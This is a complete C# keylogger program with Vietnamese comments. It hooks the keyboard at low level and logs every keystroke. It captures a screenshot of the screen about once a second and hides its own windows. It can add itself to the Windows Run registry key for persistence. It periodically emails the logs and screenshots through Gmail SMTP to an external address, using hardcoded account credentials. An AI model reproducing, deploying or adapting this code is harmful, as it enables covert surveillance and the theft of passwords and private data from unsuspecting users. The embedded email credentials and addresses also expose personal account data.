using Microsoft.Win32;
using System;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Net;
using System.Net.Mail;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;

namespace KeyLogger
{
    class Program
    {
        private static KeyLog form = new KeyLog();

        // thực hiện các công việc bắt phím và ghi file log
        #region hook key board
        private const int WH_KEYBOARD_LL = 13;      //mã mặc định của window khi nhã phím
        private const int WM_KEYDOWN = 0x0100;      //mã mặc định của window khi đè phím

        private static LowLevelKeyboardProc _proc = HookCallback;       // tạo delegate => call HookcallBack
        private static IntPtr _hookID = IntPtr.Zero;                    //handle(id của các cửa sỗ, control trong hđh) 

        private static string logName = "Log_";
        private static string logExtendtion = ".txt";



        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr SetWindowsHookEx(
            int idHook,
            LowLevelKeyboardProc lpfn,
            IntPtr hMod,
            uint dwThreadId);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool UnhookWindowsHookEx(IntPtr hhk);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr CallNextHookEx(
            IntPtr hhk,
            int nCode,
            IntPtr wParam,
            IntPtr lParam);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr GetModuleHandle(string lpModuleName);

        private delegate IntPtr LowLevelKeyboardProc(
            int nCode,
            IntPtr wParam,
            IntPtr lParam);

        //lấy ra tất cả các process đang chạy trong hđh, sau đó lấy ra main module của từng process,
        // thả hook vào chương trình đó và lấy ra handle của chương trình chính của process đó
        private static IntPtr SetHook(LowLevelKeyboardProc proc)
        {
            using (Process curProcess = Process.GetCurrentProcess())
            {
                using (ProcessModule curModule = curProcess.MainModule)
                {
                    return SetWindowsHookEx(
                        WH_KEYBOARD_LL,
                        proc,                                   //Địa chỉ của thủ tục hook mà ta muốn gắn với hook. 
                        GetModuleHandle(curModule.ModuleName),
                        0);
                }
            }
        }

        // wParam: kiểu thông điệp bàn phím, bao gồm: WM_KEYDOWN, WM_KEYUP, WM_SYSKEYDOWN, WM_SYSKEYUP.
        //lParam: value phím vừa bấm
        private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
        {
            if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)                     // kt nếu có dl trả về là có nhấn phím
            {
                int vkCode = Marshal.ReadInt32(lParam);                         // Marshal: lất dl ra nhưng không làm mất dl

                CheckHotKey(vkCode);                                            // kiễm tra có phải phím tắt (ctrl+k hoặc ctrl+h không)
                WriteLog(vkCode);                                               // ghi dl vào file log
            }

            return CallNextHookEx(_hookID, nCode, wParam, lParam);              // call đến ham nexthook để tiếp tục thực hiện lấy dl
        }

        /// <summary>
        /// Write pressed key into log.txt file
        /// </summary>
        /// <param name="vkCode"></param>
        static void WriteLog(int vkCode)
        {
            form.AddItem(((Keys)vkCode).ToString());                             // hiển thị value phím vừa nhấn lên form 
            string logNameToWrite = logName + DateTime.Now.ToLongDateString() + logExtendtion;     // tạo tên file log(theo ngày)
            StreamWriter sw = new StreamWriter(logNameToWrite, true);
            sw.Write((Keys)vkCode);                                             // ghi dữ liệu vào file log
            sw.Close();                                                         // đóng file
        }

        /// <summary>
        /// Start hook key board and hide the key logger
        /// Key logger only show again if pressed right Hot key
        /// </summary>
        static void HookKeyboard()
        {
            _hookID = SetHook(_proc);                   // thả hook vào các chương trình để lấy handle
            Application.Run();                          // chạy chương trình
            UnhookWindowsHookEx(_hookID);               // thả hook
        }

        static int isHotKey = 0;
        static bool isShowing = false;
        static Keys previoursKey = Keys.Separator;

        static void CheckHotKey(int vkCode)
        {
            if ((previoursKey == Keys.LControlKey || previoursKey == Keys.RControlKey) && (Keys)(vkCode) == Keys.K)
                isHotKey = 1;
            if ((previoursKey == Keys.LControlKey || previoursKey == Keys.RControlKey) && (Keys)(vkCode) == Keys.H)
                isHotKey = 2;

            if (isHotKey == 1)
            {
                if (!isShowing)
                {
                    DisplayForm();
                }
                else
                    HideForm();

                isShowing = !isShowing;
            }
            else if (isHotKey == 2)
            {
                DisplayWindow();
            }

            previoursKey = (Keys)vkCode;
            isHotKey = 0;
        }
        #endregion


        //chụp ảnh màn hình
        #region Capture
        static string imagePath = "Image_";
        static string imageExtendtion = ".png";

        static int imageCount = 0;                      // đếm số hình
        static int captureTime = 1000;                  // thời gian sau bao lâu thì chụp hình

        static void CaptureScreen()
        {
            //tạo ms bitmap( ma trận những điễm ảnh), lấy kích thước màn hình
            var bmpScreenshot = new Bitmap(
                Screen.PrimaryScreen.Bounds.Width,
                Screen.PrimaryScreen.Bounds.Height,
                PixelFormat.Format32bppArgb);

            // tạo 1 graphic từ bitmap (kích thước to = màn hình) để vẽ ảnh ra
            var gfxScreenshot = Graphics.FromImage(bmpScreenshot);

            // coppy tất cả những điễm ảnh trên màn hình vào graphic
            gfxScreenshot.CopyFromScreen(
                Screen.PrimaryScreen.Bounds.X,
                Screen.PrimaryScreen.Bounds.Y,
                0,
                0,
                Screen.PrimaryScreen.Bounds.Size,
                CopyPixelOperation.SourceCopy);

            //tạo tên folder lưu trữ ảnh
            string directoryImage = imagePath + DateTime.Now.ToLongDateString();

            // kt có tồn tại folder chưa, nếu chưa thì tạo mới folder
            if (!Directory.Exists(directoryImage))
            {
                Directory.CreateDirectory(directoryImage);
            }

            // tạo tên ảnh để lưu trữ
            string imageName = string.Format("{0}\\{1}{2}", directoryImage, DateTime.Now.ToLongDateString() + imageCount, imageExtendtion);

            //lưu ảnh vào thư mục
            try
            {
                bmpScreenshot.Save(imageName, ImageFormat.Png);
            }
            catch
            {
            }

            imageCount++;
        }
        #endregion

        // tạo timer (sau 1s sẽ chụp màn hình và gởi mail)
        #region Timer           
        static int interval = 1;

        static void StartTimmer()
        {
            Thread thread = new Thread(
                () =>
                {
                    while (true)
                    {
                        Thread.Sleep(1);

                        if (interval % captureTime == 0)
                        {
                            CaptureScreen();
                        }
                            

                        if (interval % mailTime == 0) {
                            SendMail();
                            interval = 0;
                        }
                            

                        interval++;
                    }
                });
            thread.IsBackground = true;
            thread.Start();
        }
        #endregion

        // thực hiện các thao tác ẩn hiện giao diện ứng dụng
        #region Windows
        [DllImport("kernel32.dll")]
        static extern int GetConsoleWindow();

        [DllImport("user32.dll")]
        static extern bool ShowWindow(int hWnd, int nCmdShow);

        // hide window code
        const int SW_HIDE = 0;

        // show window code
        const int SW_SHOW = 5;
         
        static void HideForm()
        {
            form.Hide();
        }

        static void DisplayForm()
        {
            form.Show();
        }

        static void HideWindow()
        {
            int console = GetConsoleWindow();
            ShowWindow(console, SW_HIDE);
        }

        static void DisplayWindow()
        {
            int console = GetConsoleWindow();
            ShowWindow(console, SW_SHOW);
        }
        #endregion

        // khởi động cùng window
        #region Registry that open with window
        static void StartWithOS()
        {
            RegistryKey regkey = Registry.CurrentUser.CreateSubKey("Software\\ListenToUser");
            RegistryKey regstart = Registry.CurrentUser.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run");
            string keyvalue = "1";
            try
            {
                regkey.SetValue("Index", keyvalue);
                regstart.SetValue("ListenToUser", Application.StartupPath + "\\" + Application.ProductName + ".exe");
                regkey.Close();
            }
            catch (Exception ex)
            {
            }
        }
        #endregion

        // gởi dl về mail người cài đặt
        #region Mail
        static int mailTime = 5000;

        static void SendMail()
        {
            //email body
            StringBuilder sb = new StringBuilder();

            string logFile = logName + DateTime.Now.ToLongDateString() + logExtendtion;

            if (File.Exists(logFile))
            {
                StreamReader sr = new StreamReader(logFile);

                sb.Append(sr.ReadToEnd());

                sr.Close();
            }

            using (SmtpClient sender = new SmtpClient())
            {
                sender.EnableSsl = true;
                sender.Host = "smtp.gmail.com";
                sender.Port = 587;
                sender.UseDefaultCredentials = false;
                sender.Credentials
                    = new NetworkCredential("vocabulary.723@gmail.com", "vocabulary");
                MailMessage mailMessage = new MailMessage(
                    "vocabulary.723@gmail.com",
                    "chienmd@vnext.com.vn",
                    "Thông tin thu thập được",
                    sb.ToString());
                string directoryImage = imagePath + DateTime.Now.ToLongDateString();
                DirectoryInfo image = new DirectoryInfo(directoryImage);

                foreach (FileInfo item in image.GetFiles("*.png"))
                {
                    if (File.Exists(directoryImage + "\\" + item.Name))
                        mailMessage.Attachments.Add(new Attachment(directoryImage + "\\" + item.Name));
                }

                mailMessage.IsBodyHtml = true;

                //mailMessage.CC.Add("admin@gmail.com");
                try
                {
                    sender.Send(mailMessage);
                }
                catch (Exception ex)
                {
                }
            }
        }
        #endregion

        public static void Main()
        {
           // StartWithOS();
            HideWindow();
            HideForm();

            StartTimmer();
            HookKeyboard();
        }
    }
}